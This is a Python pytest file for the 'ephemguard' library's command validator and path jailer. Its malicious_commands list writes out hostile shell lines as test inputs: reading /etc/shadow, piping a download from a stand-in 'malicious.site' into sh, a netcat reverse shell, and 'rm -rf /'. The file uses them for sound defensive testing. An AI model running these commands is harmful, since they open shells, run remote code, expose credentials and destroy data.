import pytest
from ephemguard.platform.posix import validate_command
from ephemguard.security.command_guard.base import CommandInjectionError
from ephemguard.security.path_jailer import PathJailer, PathTraversalError

def test_linux_style_policy():
    # Safe commands commonly used on Linux
    safe_commands = [
        "ls -la",
        "df -h",
        "uname -a",
        "free -m",
        "cat file.txt"
    ]
    for cmd in safe_commands:
        validate_command(cmd)

def test_linux_command_injection_blocked():
    # Dangerous Linux attack vectors
    malicious_commands = [
        "ls -la ; cat /etc/shadow",
        "df -h && curl http://malicious.site/script | sh",
        "uname -a | nc -e /bin/sh 10.0.0.1 4444",
        "echo $(whoami)",
        "echo `id`",
        "cat file.txt || rm -rf /"
    ]
    for cmd in malicious_commands:
        with pytest.raises(CommandInjectionError):
            validate_command(cmd)

def test_linux_path_confinement(tmp_path):
    jailer = PathJailer([tmp_path])
    safe_file = tmp_path / "app.log"
    safe_file.write_text("ok")
    assert jailer.check_path(safe_file).name == "app.log"
    
    with pytest.raises(PathTraversalError):
        jailer.check_path("/etc/passwd")

